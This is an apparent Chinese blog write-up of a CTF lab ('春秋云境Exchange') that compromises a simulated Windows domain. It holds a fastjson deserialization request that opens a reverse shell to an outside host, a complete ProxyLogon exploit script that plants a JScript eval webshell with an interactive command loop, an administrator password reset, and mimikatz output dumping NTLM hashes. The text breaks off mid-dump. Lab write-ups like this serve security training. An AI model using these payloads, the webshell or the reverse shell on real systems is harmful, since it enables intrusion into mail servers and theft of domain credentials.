---
typora-root-url: 春秋云境Exchange
title: 春秋云境Exchange
toc: true
categories:
  - 渗透测试
date: 2026-03-13 22:15:08
tags: 
  - 渗透测试
---

# 春秋云境Exchange

fscan扫

```
E:\Users\tiand>fscan -h 39.99.153.93 -p 1-65535
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.1

[856ms]     已选择服务扫描模式
[856ms]     开始信息扫描
[856ms]     最终有效主机数量: 1
[856ms]     开始主机扫描
[856ms]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle
[862ms]     有效端口数量: 65535
[893ms] [*] 端口开放 39.99.153.93:22
[903ms] [*] 端口开放 39.99.153.93:80
[32.4s] [*] 端口开放 39.99.153.93:8000
[4m5s]     扫描完成, 发现 3 个开放端口
[4m5s]     存活端口数量: 3
[4m5s]     开始漏洞扫描
[4m5s]     POC加载完成: 总共387个，成功387个，失败0个
[4m5s] [*] 网站标题 http://39.99.153.93       状态码:200 长度:19813  标题:lumia
[4m5s] [*] 网站标题 http://39.99.153.93:8000  状态码:302 长度:0      标题:无标题 重定向地址: http://39.99.153.93:8000/login.html
[4m5s] [*] 网站标题 http://39.99.153.93:8000/login.html 状态码:200 长度:5662   标题:Lumia ERP
[4m16s]     扫描已完成: 5/5
```

## Lumia ERP

发现Lumia ERP华夏ERP v2.3  admin:123456弱口令进入			

找到一篇先知代码审计，定位rce位置去复现

![image-20260313193525799](image-20260313193525799.png)

```
GET http://39.99.153.93:8000/depot/list?search={{url({"@type":"java.net.Inet4Address","val":"31ce729b.log.dnslog.pp.ua"})}}&currentPage=1&pageSize=15 HTTP/1.1
Host: 39.99.153.93:8000
```

### fastjson 反序列化

尝试打fastjson 反序列化

上网查到的，复现

https://github.com/dushixiang//releases/tag/v0.0.2

开一个evil-mysql-server

```
GET http://39.99.153.93:8000/depot/list?search={{url({
    "name": {
        "@type": "java.lang.AutoCloseable",
        "@type": "com.mysql.jdbc.JDBC4Connection",
        "hostToConnectTo": "121.37.16.139",
        "portToConnectTo": 3306,
        "info": {
            "user": "yso_CommonsCollections6_bash -c {echo,{{b64(sh -i >& /dev/tcp/121.37.16.139/9000 0>&1)}}}|{base64,-d}|{bash,-i}",
            "password": "pass",
            "statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
            "autoDeserialize": "true",
            "NUM_HOSTS": "1"
        }
    }
})}}&currentPage=1&pageSize=15 HTTP/1.1
Host: 39.99.153.93:8000
```

```
# cat /root/flag/flag01.txt
 ██     ██ ██     ██       ███████   ███████       ██     ████     ██   ████████
░░██   ██ ░██    ████     ██░░░░░██ ░██░░░░██     ████   ░██░██   ░██  ██░░░░░░██
 ░░██ ██  ░██   ██░░██   ██     ░░██░██   ░██    ██░░██  ░██░░██  ░██ ██      ░░
  ░░███   ░██  ██  ░░██ ░██      ░██░███████    ██  ░░██ ░██ ░░██ ░██░██
   ██░██  ░██ ██████████░██      ░██░██░░░██   ██████████░██  ░░██░██░██    █████
  ██ ░░██ ░██░██░░░░░░██░░██     ██ ░██  ░░██ ░██░░░░░░██░██   ░░████░░██  ░░░░██
 ██   ░░██░██░██     ░██ ░░███████  ░██   ░░██░██     ░██░██    ░░███ ░░████████
░░     ░░ ░░ ░░      ░░   ░░░░░░░   ░░     ░░ ░░      ░░ ░░      ░░░   ░░░░░░░░

                        |  |  ||  | /~~\  /\  |\  /|~|~
                        |  |  ||--||    |/__\ | \/ | |
                         \/ \/ |  | \__//    \|    |_|_

              flag01: flag{e9b1f2f7-1a75-4d45-a7e7-b142f655513b}
```

传fscan挂代理

```
# chmod +x fscan
# chmod +x linux*
# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:16:3e:08:46:a5 brd ff:ff:ff:ff:ff:ff
    inet 172.22.3.12/16 brd 172.22.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fe08:46a5/64 scope link
       valid_lft forever preferred_lft forever
# ./fscan -h 172.22.3.12/24

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
(icmp) Target 172.22.3.12     is alive
(icmp) Target 172.22.3.2      is alive
(icmp) Target 172.22.3.26     is alive
(icmp) Target 172.22.3.9      is alive
[*] Icmp alive hosts len is: 4
172.22.3.9:445 open
172.22.3.26:445 open
172.22.3.2:445 open
172.22.3.9:443 open
172.22.3.9:139 open
172.22.3.2:139 open
172.22.3.26:139 open
172.22.3.26:135 open
172.22.3.9:135 open
172.22.3.2:135 open
172.22.3.9:80 open
172.22.3.12:80 open
172.22.3.12:22 open
172.22.3.9:81 open
172.22.3.12:8000 open
172.22.3.9:8172 open
172.22.3.9:808 open
172.22.3.2:88 open
[*] alive ports len is: 18
start vulscan
[*] NetInfo
[*]172.22.3.2
   [->]XIAORANG-WIN16
   [->]172.22.3.2
[*] OsInfo 172.22.3.2   (Windows Server 2016 Datacenter 14393)
[*] NetBios 172.22.3.26     XIAORANG\XIAORANG-PC
[*] NetInfo
[*]172.22.3.9
   [->]XIAORANG-EXC01
   [->]172.22.3.9
[*] NetInfo
[*]172.22.3.26
   [->]XIAORANG-PC
   [->]172.22.3.26
[*] NetBios 172.22.3.2      [+] DC:XIAORANG-WIN16.xiaorang.lab      Windows Server 2016 Datacenter 14393
[*] WebTitle http://172.22.3.12:8000   code:302 len:0      title:None 跳转url: http://172.22.3.12:8000/login.html
[*] WebTitle http://172.22.3.12        code:200 len:19813  title:lumia
[*] WebTitle http://172.22.3.12:8000/login.html code:200 len:5662   title:Lumia ERP
[*] NetBios 172.22.3.9      XIAORANG-EXC01.xiaorang.lab         Windows Server 2016 Datacenter 14393
[*] WebTitle http://172.22.3.9:81      code:403 len:1157   title:403 - 禁止访问: 访问被拒绝。
[*] WebTitle https://172.22.3.9:8172   code:404 len:0      title:None
[*] WebTitle http://172.22.3.9         code:403 len:0      title:None
[*] WebTitle https://172.22.3.9        code:302 len:0      title:None 跳转url: https://172.22.3.9/owa/
[*] WebTitle https://172.22.3.9/owa/auth/logon.aspx?url=https%3a%2f%2f172.22.3.9%2fowa%2f&reason=0 code:200 len:28237  title:Outlook
已完成 18/18

172.22.3.12（入口点）
172.22.3.26（XIAORANG-PC）
172.22.3.9（WEB）
172.22.3.2（DC）
```

访问https://172.22.3.9

## Exchange（Outlook Web Access）

**Microsoft Exchange Server** 是 **Microsoft** 提供的一种 **企业级邮件服务器软件**，主要用于公司内部的 **邮件、日历、通讯录和协作管理**。

Exchange Server 本质是 **企业邮件系统服务器**，类似于公司自己的 Gmail。

常见客户端：

- Microsoft Outlook
- 浏览器访问 **OWA（Outlook Web Access）**
- 手机邮件客户端

直接打 [ProxyLogon](https://github.com/hausec/ProxyLogon)

peiqi文库也找到一个，修改后代码

```
#!/usr/bin/python2
# coding: UTF-8

import re
import sys
import json
import string
import requests
from urllib import urlencode
from tld import get_fld
from struct import unpack
from base64 import b64encode, b64decode
from requests.packages.urllib3.exceptions import InsecureRequestWarning


def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号 : PeiQi文库                                                \033[0m')
    print('+  \033[34mVersion: Microsoft Exchang 多个版本                                \033[0m')
    print('+  \033[36m使用格式:  python exp.py                                           \033[0m')
    print('+  \033[36mUrl         >>> mail.xxx.org                                       \033[0m')
    print('+  \033[36mEmail       >>> Administrator@根域名  (默认)                        \033[0m')
    print('+------------------------------------------')


def _unpack_str(byte_string):
    return byte_string.decode('UTF-8').replace('\x00', '')


def _unpack_int(format, data):
    return unpack(format, data)[0]


def parse_challenge(Negotiate_base64_decode):
    target_info_field = Negotiate_base64_decode[40:48]
    target_info_len = _unpack_int('H', target_info_field[0:2])
    target_info_offset = _unpack_int('I', target_info_field[4:8])

    target_info_bytes = Negotiate_base64_decode[target_info_offset:target_info_offset + target_info_len]

    domain_name = ''
    computer_name = ''
    info_offset = 0
    while info_offset < len(target_info_bytes):
        av_id = _unpack_int('H', target_info_bytes[info_offset:info_offset + 2])
        av_len = _unpack_int('H', target_info_bytes[info_offset + 2:info_offset + 4])
        av_value = target_info_bytes[info_offset + 4:info_offset + 4 + av_len]

        info_offset = info_offset + 4 + av_len
        if av_id == 2:  # MsvAvDnsDomainName
            domain_name = _unpack_str(av_value)
        elif av_id == 3:  # MsvAvDnsComputerName
            computer_name = _unpack_str(av_value)

    if domain_name and computer_name:
        return domain_name, computer_name
    else:
        print("\033[31m[x] 计算机名称或域名称获取失败")
        sys.exit(0)


def POC_1(target_url, Email):
    print("\033[32m[o] 正在获取 计算机名称和域名称.....\033[0m")
    ntlm_type1 = (
        'NTLMSSP\x00'  # NTLMSSp签名
        '\x01\x00\x00\x00'  # 信息类型
        '\x97\x82\x08\xe2'  # 标记
        '\x00\x00\x00\x00\x00\x00\x00\x00'  # 域名称字符
        '\x00\x00\x00\x00\x00\x00\x00\x00'  # 工作字符
        '\x0a\x00\xba\x47\x00\x00\x00\x0f'  # 系统版本
    )
    headers = {
        'Authorization': 'Negotiate {}'.format(b64encode(ntlm_type1))
    }
    basic_url = 'https://{}/rpc/'.format(target_url)
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    response = requests.get(url=basic_url, headers=headers, verify=False)
    if response.status_code == 401:
        Negotiate_base64_encode = response.headers['WWW-Authenticate']
        Negotiate_base64_decode = re.search('Negotiate ([A-Za-z0-9/+=]+)', Negotiate_base64_encode).group(1)
        domain_name, computer_name = parse_challenge(b64decode(Negotiate_base64_decode))
        print("\033[32m[o] 计算机名称: {}\033[0m".format(computer_name))
        print("\033[32m[o] 域名称:    {}\033[0m".format(domain_name))
        POC_2(target_url, Email, computer_name)
    else:
        print("\033[31m[x] 获取失败")
        sys.exit(0)


def POC_2(target_url, Email, computer_name):
    payload = '''
<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
    <Request>
         <EMailAddress>%s</EMailAddress>
        <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
    </Request>
</Autodiscover>
    ''' % Email
    vuln_url = '/autodiscover/autodiscover.xml'
    headers = {
        'User-Agent': 'ExchangeServicesClient/0.0.0.0',
        'Content-Type': 'text/xml',
        'Cookie': 'X-BEResource=a]@{}:444{}?#~1941962753'.format(computer_name, vuln_url),
        'msExchLogonMailbox': 'S-1-5-20'
    }
    url = "https://{}/ecp/PeiQi.js".format(target_url)
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    response = requests.post(url, headers=headers, data=payload, verify=False, allow_redirects=False)
    LegacyDN = re.findall(r'<LegacyDN>(.*?)</LegacyDN>', response.text)[0]
    print("\033[32m[o] LegacyDN: {}\033[0m".format(LegacyDN))

    vuln_url = '/mapi/emsmdb/'
    headers = {
        'X-Clientapplication': 'Outlook/15.0.4815.1002',
        'X-Requestid': 'x',
        'X-Requesttype': 'Connect',
        'Cookie': 'X-BEResource=a]@{}:444{}?#~1941962753'.format(computer_name, vuln_url),
        'Content-Type': 'application/mapi-http',
        'msExchLogonMailbox': 'S-1-5-20',
    }
    payload = LegacyDN + '\x00\x00\x00\x00\x00\x20\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00'
    url = "https://{}/ecp/PeiQi.js".format(target_url)
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    response = requests.post(url, headers=headers, data=payload, verify=False, allow_redirects=False)
    SID = re.search('with SID ([S\-0-9]+) ', response.content).group(1)
    print("\033[32m[o] SID: {}\033[0m".format(SID))

    vuln_url = '/ecp/proxyLogon.ecp'
    payload = '<r at="NTLM" ln="%s"><s t="0">%s</s></r>' % (Email.split('@')[0], SID)
    headers = {
        'X-Clientapplication': 'Outlook/15.0.4815.1002',
        'X-Requestid': 'x',
        'X-Requesttype': 'Connect',
        'Cookie': 'X-BEResource=a]@{}:444{}?#~1941962753'.format(computer_name, vuln_url),
        'Content-Type': 'application/json',
        'msExchLogonMailbox': 'S-1-5-20',
    }
    url = "https://{}/ecp/PeiQi.js".format(target_url)
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    response = requests.post(url, headers=headers, data=payload, verify=False, allow_redirects=False)
    session_id = response.cookies.get('ASP.NET_SessionId')
    canary = response.cookies.get('msExchEcpCanary')
    print("\033[32m[o] Session_id: {}\033[0m".format(session_id))
    print("\033[32m[o] Canary    : {}\033[0m".format(canary))

    extra_cookies = [
        'ASP.NET_SessionId=' + session_id,
        'msExchEcpCanary=' + canary
    ]
    vuln_url = '/ecp/DDI/DDIService.svc/GetObject'
    qs = urlencode({
        'schema': 'OABVirtualDirectory',
        'msExchEcpCanary': canary
    })
    headers = {
        'X-Clientapplication': 'Outlook/15.0.4815.1002',
        'X-Requestid': 'x',
        'X-Requesttype': 'Connect',
        'Cookie': 'X-BEResource=a]@{}:444{}?{}#~1941962753;ASP.NET_SessionId={};msExchEcpCanary={}'.format(
            computer_name, vuln_url, qs, session_id, canary),
        'Content-Type': 'application/json',
        'msExchLogonMailbox': 'S-1-5-20',
    }
    url = "https://{}/ecp/PeiQi.js".format(target_url)
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    response = requests.post(url, headers=headers, data='', verify=False, allow_redirects=False)
    identity = response.json()['d']['Output'][0]['Identity']
    print("\033[32m[o] OAB Name: {}\033[0m".format(identity['DisplayName']))
    print("\033[32m[o] OAB ID: {}\033[0m".format(identity['RawIdentity']))

    FILE_PATH = 'C:\\inetpub\\wwwroot\\aspnet_client\\PeiQi.aspx'
    FILE_DATA = '<script language="JScript" runat="server">function Page_Load(){eval(Request["PeiQi"],"unsafe");}</script>'

    vuln_url = '/ecp/DDI/DDIService.svc/SetObject'
    qs = urlencode({
        'schema': 'OABVirtualDirectory',
        'msExchEcpCanary': canary
    })
    payload = json.dumps({
        'identity': {
            '__type': 'Identity:ECP',
            'DisplayName': identity['DisplayName'],
            'RawIdentity': identity['RawIdentity']
        },
        'properties': {
            'Parameters': {
                '__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel',
                'ExternalUrl': 'http://f/' + FILE_DATA
            }
        }
    })
    headers = {
        'X-Clientapplication': 'Outlook/15.0.4815.1002',
        'X-Requestid': 'x',
        'X-Requesttype': 'Connect',
        'Cookie': 'X-BEResource=a]@{}:444{}?{}#~1941962753;ASP.NET_SessionId={};msExchEcpCanary={}'.format(
            computer_name, vuln_url, qs, session_id, canary),
        'Content-Type': 'application/json',
        'msExchLogonMailbox': 'S-1-5-20',
    }
    url = "https://{}/ecp/PeiQi.js".format(target_url)
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    response = requests.post(url, headers=headers, data=payload, verify=False, allow_redirects=False)
    if response.status_code == 200:
        print("\033[32m[o] 通过OAB设置Webshell成功\033[0m")

    vuln_url = "/ecp/DDI/DDIService.svc/SetObject"
    qs = urlencode({
        'schema': 'ResetOABVirtualDirectory',
        'msExchEcpCanary': canary
    })
    payload = json.dumps({
        'identity': {
            '__type': 'Identity:ECP',
            'DisplayName': identity['DisplayName'],
            'RawIdentity': identity['RawIdentity']
        },
        'properties': {
            'Parameters': {
                '__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel',
                'FilePathName': FILE_PATH
            }
        }
    })
    headers = {
        'X-Clientapplication': 'Outlook/15.0.4815.1002',
        'X-Requestid': 'x',
        'X-Requesttype': 'Connect',
        'Cookie': 'X-BEResource=a]@{}:444{}?{}#~1941962753;ASP.NET_SessionId={};msExchEcpCanary={}'.format(
            computer_name, vuln_url, qs, session_id, canary),
        'Content-Type': 'application/json',
        'msExchLogonMailbox': 'S-1-5-20',
    }
    url = "https://{}/ecp/PeiQi.js".format(target_url)
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    response = requests.post(url, headers=headers, data=payload, verify=False, allow_redirects=False)
    if response.status_code == 200:
        print("\033[32m[o] 正在尝试写入Webshell\033[0m")

    vuln_url = "/ecp/DDI/DDIService.svc/SetObject"
    qs = urlencode({
        'schema': 'OABVirtualDirectory',
        'msExchEcpCanary': canary
    })
    payload = json.dumps({
        'identity': {
            '__type': 'Identity:ECP',
            'DisplayName': identity['DisplayName'],
            'RawIdentity': identity['RawIdentity']
        },
        'properties': {
            'Parameters': {
                '__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel',
                'ExternalUrl': ''
            }
        }
    })
    headers = {
        'X-Clientapplication': 'Outlook/15.0.4815.1002',
        'X-Requestid': 'x',
        'X-Requesttype': 'Connect',
        'Cookie': 'X-BEResource=a]@{}:444{}?{}#~1941962753;ASP.NET_SessionId={};msExchEcpCanary={}'.format(
            computer_name, vuln_url, qs, session_id, canary),
        'Content-Type': 'application/json',
        'msExchLogonMailbox': 'S-1-5-20',
    }
    url = "https://{}/ecp/PeiQi.js".format(target_url)
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    response = requests.post(url, headers=headers, data=payload, verify=False, allow_redirects=False)
    print("\033[32m[o] 清除 OAB\033[0m")
    print("\033[32m[o] 正在验证 Webshell是否上传成功..........\033[0m")
    webshell_url = "https://" + target_url + "/aspnet_client/PeiQi.aspx"
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    response = requests.get(url=webshell_url, verify=False, allow_redirects=False)
    if response.status_code == 200 and "Name" in response.text:
        print("\033[32m[o] 上传 Webshll成功, 地址为:{}\033[0m".format("https://" + target_url + "/aspnet_client/PeiQi.aspx"))
        print("\033[32m[o] 响应为:\n{}\033[0m".format(response.text))
        while True:
            Cmd = str(raw_input("\033[35mCmd >>> \033[0m"))
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
            Cmd_url = "https://" + target_url + '/aspnet_client/PeiQi.aspx?PeiQi=Response.Write(new%20ActiveXObject("WScript.Shell").exec("cmd /c {}").StdOut.ReadAll());'.format(Cmd)
            response = requests.get(url=Cmd_url, verify=False, allow_redirects=False)
            print("\033[32m[o] 响应为:\n{}\033[0m".format(response.text))


if __name__ == '__main__':
    reload(sys)  
    sys.setdefaultencoding('utf8')  
    title()
    # target_url = str(raw_input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    target_url = "172.22.3.9"
    # Email = "Administrator@{}".format(get_fld("https://" + target_url))
    Email = "Administrator@{}".format("xiaorang.lab")
    print("\033[32m[o] 请求地址:{}，使用的邮箱:{}\033[0m".format(target_url, Email))
    POC_1(target_url, Email)
```

```
└─$ proxychains python2 exchange-rce-exp.py 
ProxyChains-3.1 (http://proxychains.sf.net)
|DNS-request| ::1 
|S-chain|-<>-172.19.192.1:1080-<><>-4.2.2.2:53-<--timeout
|S-chain|-<>-172.19.192.1:1080-<><>-4.2.2.2:53-<--timeout
|S-chain|-<>-172.19.192.1:1080-<><>-4.2.2.2:53-<--timeout
|DNS-response|: ::1 does not exist
+------------------------------------------
+  POC_Des: http://wiki.peiqi.tech
+  Github : https://github.com/PeiQi0
+  公众号 : PeiQi文库
+  Version: Microsoft Exchang 多个版本
+  使用格式:  python exp.py
+  Url         >>> mail.xxx.org
+  Email       >>> Administrator@根域名  (默认)
+------------------------------------------
[o] 请求地址:172.22.3.9，使用的邮箱:Administrator@xiaorang.lab
[o] 正在获取 计算机名称和域名称.....
|S-chain|-<>-172.19.192.1:1080-<><>-172.22.3.9:443-<><>-OK
[o] 计算机名称: XIAORANG-EXC01.xiaorang.lab
[o] 域名称:    XIAORANG
|S-chain|-<>-172.19.192.1:1080-<><>-172.22.3.9:443-<><>-OK
[o] LegacyDN: /o=XIAORANG LAB/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=8ca6ff254802459d9f63ee916eabb487-Administrat
|S-chain|-<>-172.19.192.1:1080-<><>-172.22.3.9:443-<><>-OK
[o] SID: S-1-5-21-533686307-2117412543-4200729784-500
|S-chain|-<>-172.19.192.1:1080-<><>-172.22.3.9:443-<><>-OK
[o] Session_id: c3915d3a-df2a-4ff9-8ec7-213c65227a7a
[o] Canary    : ceRRVMK94EKnzMYtG126lLHgr_-Wgt4IVFREqZK2YGCYl0UdG3bZjY5ziHkLAzyNC_nxAFdDdu0.
|S-chain|-<>-172.19.192.1:1080-<><>-172.22.3.9:443-<><>-OK
[o] OAB Name: OAB (Default Web Site)
[o] OAB ID: 6d8fb74b-8477-43ee-83ba-0b119205e85f
|S-chain|-<>-172.19.192.1:1080-<><>-172.22.3.9:443-<><>-OK
[o] 通过OAB设置Webshell成功
|S-chain|-<>-172.19.192.1:1080-<><>-172.22.3.9:443-<><>-OK
[o] 正在尝试写入Webshell
|S-chain|-<>-172.19.192.1:1080-<><>-172.22.3.9:443-<><>-OK
[o] 清除 OAB
[o] 正在验证 Webshell是否上传成功..........
|S-chain|-<>-172.19.192.1:1080-<><>-172.22.3.9:443-<><>-OK
[o] 上传 Webshll成功, 地址为:https://172.22.3.9/aspnet_client/PeiQi.aspx
[o] 响应为:
Name                            : OAB (Default Web Site)
PollInterval                    : 480
OfflineAddressBooks             : \榛樿鑴辨満閫氳绨?
RequireSSL                      : True
BasicAuthentication             : False
WindowsAuthentication           : True
OAuthAuthentication             : True
MetabasePath                    : IIS://XIAORANG-EXC01.xiaorang.lab/W3SVC/1/ROOT/OAB
Path                            : C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\OAB
ExtendedProtectionTokenChecking : None
ExtendedProtectionFlags         :
ExtendedProtectionSPNList       :
AdminDisplayVersion             : Version 15.1 (Build 1591.10)
Server                          : XIAORANG-EXC01
InternalUrl                     : https://xiaorang-exc01.xiaorang.lab/OAB
InternalAuthenticationMethods   : OAuth
                                  WindowsIntegrated
ExternalUrl                     : http://f/
ExternalAuthenticationMethods   : OAuth
                                  WindowsIntegrated
AdminDisplayName                :
ExchangeVersion                 : 0.10 (14.0.100.0)
DistinguishedName               : CN=OAB (Default Web Site),CN=HTTP,CN=Protocols,CN=XIAORANG-EXC01,CN=Servers,CN=Exchange Administrative Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=XIAORANG LAB,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=xiaorang,DC=lab
Identity                        : XIAORANG-EXC01\OAB (Default Web Site)
Guid                            : 6d8fb74b-8477-43ee-83ba-0b119205e85f
ObjectCategory                  : xiaorang.lab/Configuration/Schema/ms-Exch-OAB-Virtual-Directory
ObjectClass                     : top
                                  msExchVirtualDirectory
                                  msExchOABVirtualDirectory
WhenChanged                     : 2026/3/13 21:30:22
WhenCreated                     : 2022/10/23 16:28:41
WhenChangedUTC                  : 2026/3/13 13:30:22
WhenCreatedUTC                  : 2022/10/23 8:28:41
OrganizationId                  :
Id                              : XIAORANG-EXC01\OAB (Default Web Site)
OriginatingServer               : XIAORANG-WIN16.xiaorang.lab
IsValid                         : True


Cmd >>> whoami
|S-chain|-<>-172.19.192.1:1080-<><>-172.22.3.9:443-<><>-OK
[o] 响应为:
nt authority\system
```

好多命令执行报错的，

```
net user administrator admin@123
```

然后rdp上去

```
C:\Users\Administrator>dir C:\ /S /B |findstr flag
C:\Users\Administrator.XIAORANG\flag
C:\Users\Administrator.XIAORANG\flag\flag02.txt
^C
C:\Users\Administrator>type C:\Users\Administrator.XIAORANG\flag\flag02.txt
Yb  dP 88    db     dP"Yb  88""Yb    db    88b 88  dP""b8
 YbdP  88   dPYb   dP   Yb 88__dP   dPYb   88Yb88 dP   `"
 dPYb  88  dP__Yb  Yb   dP 88"Yb   dP__Yb  88 Y88 Yb  "88
dP  Yb 88 dP""""Yb  YbodP  88  Yb dP""""Yb 88  Y8  YboodP


    / /
   / /                  _   __     ( )  ___
  / /        //   / / // ) )  ) ) / / //   ) )
 / /        //   / / // / /  / / / / //   / /
/ /____/ / ((___( ( // / /  / / / / ((___( (



flag02: flag{50a20874-fd6e-4df8-aa0e-df8b689a4c72}
```

找到domain admins路径

![image-20260321202351267](image-20260321202351267.png)

但是抓了下hash没有域administrator的

```

C:\Users\Administrator\Desktop>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 1999417 (00000000:001e8239)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2026/3/21 19:45:11
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : XIAORANG-EXC01$
         * Domain   : XIAORANG
         * NTLM     : b5d5d2a6ab2bc5cf19f330caf7795be9
         * SHA1     : a5326a240fffa8d11bf708f7224dc2b3bc04e2a4
        tspkg :
        wdigest :
         * Username : XIAORANG-EXC01$
         * Domain   : XIAORANG
         * Password : (null)
        kerberos :
         * Username : XIAORANG-EXC01$
         * Domain   : xiaorang.lab
         * Password : ca 94 d0 83 ed 51 dd 31 5b 22 23 d6 8d ed 81 fc 0d 8f 59 02 3e 16 1d 6b 18 d9 97 c8 12 84 52 b9 c7 ec d4 e3 06 18 3b 7e a1 61 d8 18 4c dd bb f6 9d f6 0c 02 d2 28 64 10 89 d6 8c 99 c1 96 8a 06 34 1d d2 6e f3 7f 93 f2 e8 04 45 f5 46 b6 17 35 a0 3e 1c e0 c7 ac 53 2a c8 93 f9 dd 36 8c ad a8 e8 ad 5a 99 38 c3 63 14 53 52 7a a3 7f c0 e3 cc da d7 10 06 7b d0 f7 56 fd f0 e3 c6 81 55 8a be 96 86 10 42 85 cb 71 f6 2a 48 87 38 2c e9 3c 17 45 fb c4 9e c5 b9 26 dd cf 7e f7 1b 89 d6 d5 e6 2e 45 f3 78 fe 4d 21 09 42 6e 54 60 01 bd 26 49 7a 50 56 46 87 2d e3 2f 37 0f 61 4a 42 29 fb 07 dd 24 d0 2c 1b ac 94 81 16 75 18 9f 7e 2e 14 fe e5 e9 65 b9 19 16 5d 76 56 43 69 c4 92 5c a8 ea 97 67 d5 83 d9 a0 b7 4f 5b f3 c9 ac 04 c0 7c 8b
        ssp :
        credman :

Authentication Id : 0 ; 1999397 (00000000:001e8225)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2026/3/21 19:45:11
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : XIAORANG-EXC01$
         * Domain   : XIAORANG
         * NTLM     : b5d5d2a6ab2bc5cf19f330caf7795be9
         * SHA1     : a5326a240fffa8d11bf708f7224dc2b3bc04e2a4
        tspkg :
        wdigest :
         * Username : XIAORANG-EXC01$
         * Domain   : XIAORANG
         * Password : (null)
        kerberos :
         * Username : XIAORANG-EXC01$
         * Domain   : xiaorang.lab
         * Password : ca 94 d0 83 ed 51 dd 31 5b 22 23 d6 8d ed 81 fc 0d 8f 59 02 3e 16 1d 6b 18 d9 97 c8 12 84 52 b9 c7 ec d4 e3 06 18 3b 7e a1 61 d8 18 4c dd bb f6 9d f6 0c 02 d2 28 64 10 89 d6 8c 99 c1 96 8a 06 34 1d d2 6e f3 7f 93 f2 e8 04 45 f5 46 b6 17 35 a0 3e 1c e0 c7 ac 53 2a c8 93 f9 dd 36 8c ad a8 e8 ad 5a 99 38 c3 63 14 53 52 7a a3 7f c0 e3 cc da d7 10 06 7b d0 f7 56 fd f0 e3 c6 81 55 8a be 96 86 10 42 85 cb 71 f6 2a 48 87 38 2c e9 3c 17 45 fb c4 9e c5 b9 26 dd cf 7e f7 1b 89 d6 d5 e6 2e 45 f3 78 fe 4d 21 09 42 6e 54 60 01 bd 26 49 7a 50 56 46 87 2d e3 2f 37 0f 61 4a 42 29 fb 07 dd 24 d0 2c 1b ac 94 81 16 75 18 9f 7e 2e 14 fe e5 e9 65 b9 19 16 5d 76 56 43 69 c4 92 5c a8 ea 97 67 d5 83 d9 a0 b7 4f 5b f3 c9 ac 04 c0 7c 8b
        ssp :
        credman :

Authentication Id : 0 ; 102612 (00000000:000190d4)
Session           : Service from 0
User Name         : Zhangtong
Domain            : XIAORANG
Logon Server      : XIAORANG-WIN16
Logon Time        : 2026/3/21 19:43:23
SID               : S-1-5-21-533686307-2117412543-4200729784-1147
        msv :
         [00000003] Primary
         * Username : Zhangtong
         * Domain   : XIAORANG
